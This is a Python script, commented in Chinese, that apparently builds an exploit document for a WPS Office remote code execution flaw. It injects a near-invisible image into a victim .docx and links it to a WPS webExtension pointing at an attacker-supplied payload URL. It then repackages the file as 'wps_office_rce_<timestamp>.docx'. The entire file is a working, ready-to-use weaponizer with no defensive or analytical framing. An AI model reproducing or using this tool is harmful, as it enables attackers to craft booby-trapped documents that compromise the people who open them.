#! coding=utf-8
import os
import sys
import time
import zipfile
import shutil

from lxml import etree
from docx import Document
from docx.shared import Inches

# 常量
TEMP_PATH = 'workdir'
TEMP_DOCX_PATH = f'{TEMP_PATH}/hacker_temp.docx'
EXTRACT_TEMP_FOLDER = f'{TEMP_PATH}/extract_temp_dir'

def add_image_to_docx(hacker_docx_path):
    """
    向现有文档的中间插入预定义的图片。
    """

    print("向文档中插入图片...")

    # 创建 Document 类的新实例
    doc = Document(hacker_docx_path)

    # 定义图片和行索引
    image_path = 'data/image.png'
    insert_row_index = len(doc.paragraphs) // 2

    # 插入图片
    run = doc.paragraphs[insert_row_index].add_run()
    inline_shape = run.add_picture(image_path, width=Inches(0.1), height=Inches(0.1))

    # 获取图片 ID
    blip = inline_shape._inline.graphic.graphicData.pic.blipFill.blip
    image_id = blip.embed

    # 将文档保存到临时文件
    doc.save(TEMP_DOCX_PATH)

    print(f"插入图片成功，图片ID: {image_id}")
    return image_id


def extract_docx():
    """
    将上述创建的临时文档的内容提取到临时文件夹中。
    """

    print("解压docx文件，提取临时文档内容...")

    # 如果临时文件夹不存在，则创建
    if not os.path.exists(EXTRACT_TEMP_FOLDER):
        os.makedirs(EXTRACT_TEMP_FOLDER)

    # 打开临时文件并提取内容
    with zipfile.ZipFile(TEMP_DOCX_PATH, 'r') as zip_ref:
        zip_ref.extractall(EXTRACT_TEMP_FOLDER)


def make_exp_file(payload_url):
    """
    将所需数据复制到相应路径并更新有效负载。
    """

    print("拷贝必要文件，并添加URL载荷...")

    # 定义所需路径
    webExtensions_path = f'{EXTRACT_TEMP_FOLDER}/word/webExtensions'

    # 复制 webExtensions 目录

    shutil.copytree('data/webExtensions', webExtensions_path)

    # 修改 webExtension1.xml 中的有效负载 URL
    with open(f'{EXTRACT_TEMP_FOLDER}/word/webExtensions/webExtension1.xml', 'r+') as file:
        file_content = file.read()
        modified_content = file_content.replace('http://clientweb.docer.wps.cn.cloudwps.cn/1.html', payload_url)
        file.seek(0)
        file.write(modified_content)
        file.truncate()

def increment_image_id(image_id):
    number_part = int(''.join(filter(str.isdigit, image_id)))
    incremented_number = number_part + 1
    new_image_id = f"rId{incremented_number}"
    return new_image_id

def fix_document_xml(image_id, web_extension_id):
    """
    修改 document.xml 文件并替换图片 ID。
    """

    print("修改 document.xml 文件...")

    # 解析 XML
    document_xml_path = f'{EXTRACT_TEMP_FOLDER}/word/document.xml'
    tree = etree.parse(document_xml_path)
    root = tree.getroot()

    # 定义命名空间
    namespaces = {
        'pic': 'http://schemas.openxmlformats.org/drawingml/2006/picture',
        'a': 'http://schemas.openxmlformats.org/drawingml/2006/main',
        'r': 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
    }

    # 查找 pic:pic 节点并根据需要进行修改
    pic_nodes = root.xpath(f".//pic:pic[pic:blipFill/a:blip/@r:embed='{image_id}']", namespaces=namespaces)

    for pic_node in pic_nodes:
        sp_pr_node = pic_node.find("pic:spPr", namespaces=namespaces)

        if sp_pr_node is None:
            sp_pr_node = etree.SubElement(pic_node, 'pic:spPr', nsmap=namespaces)

        new_ext_lst_xml = f'''<a:extLst xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><wpswe:webExtensionRef xmlns:wpswe="http://www.wps.cn/officeDocument/2018/webExtension" r:id="{web_extension_id}"/></a:extLst>'''

        new_ext_lst = etree.fromstring(new_ext_lst_xml, parser=etree.XMLParser(ns_clean=False, remove_blank_text=True, remove_comments=True), base_url=None)

        sp_pr_node.append(new_ext_lst)

    # 保存修改后的 XML
    tree.write(document_xml_path, pretty_print=False, xml_declaration=True, encoding="UTF-8")


def fix_document_xml_rels(web_extension_id):
    """
    修改 document.xml.rels 文件并添加webExtension。
    """

    print("修改 document.xml.rels 文件...")

    # 解析 XML
    document_xml_path = f'{EXTRACT_TEMP_FOLDER}/word/_rels/document.xml.rels'
    tree = etree.parse(document_xml_path)
    root = tree.getroot()

    # Namespace and new element to add
    namespace = "http://schemas.openxmlformats.org/package/2006/relationships"
    new_relationship_attrs = {
        "Id": web_extension_id,
        "Type": "http://www.wps.cn/officeDocument/2018/webExtension",
        "Target": "webExtensions/webExtension1.xml"
    }

    # Create a new Relationship element
    new_relationship = etree.Element(f"{{{namespace}}}Relationship", attrib=new_relationship_attrs)

    # Add the new element to the root
    root.append(new_relationship)

    # 保存修改后的 XML
    tree.write(document_xml_path, pretty_print=False, xml_declaration=True, encoding="UTF-8")

def packaged_docx_file():

    print("打包生成 docx 文件...")

    timestamp = int(time.time())
    new_docx_file_path = f'wps_office_rce_{timestamp}.docx'

    # 创建一个 ZipFile 对象，并指定压缩模式
    with zipfile.ZipFile(new_docx_file_path, 'w', compression=zipfile.ZIP_DEFLATED) as zipf:
        # 遍历目录，压缩所有文件
        for root, dirs, files in os.walk(EXTRACT_TEMP_FOLDER):
            for file in files:
                # 获取当前文件的完整路径
                file_path = os.path.join(root, file)
                # 添加文件到 ZIP 文件中
                zipf.write(file_path, os.path.relpath(file_path, EXTRACT_TEMP_FOLDER))
    return new_docx_file_path
    

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("用法： python main.py hack_docx payload_url")
        exit(0)

    if os.path.exists(TEMP_PATH):
        shutil.rmtree(TEMP_PATH)
        os.makedirs(TEMP_PATH)
    else:
        os.makedirs(TEMP_PATH)
    
    hacker_docx = sys.argv[1].strip()
    payload_url = sys.argv[2].strip()

    # 主执行
    print("开始进行docx注入工作...")

    image_id = add_image_to_docx(hacker_docx)
    web_extension_id = increment_image_id(image_id)
    extract_docx()
    make_exp_file(payload_url)
    fix_document_xml(image_id, web_extension_id)
    fix_document_xml_rels(web_extension_id)
    new_docx_file_path = packaged_docx_file()

    print(f"所有工作已完成，生成的新文件在： {new_docx_file_path}")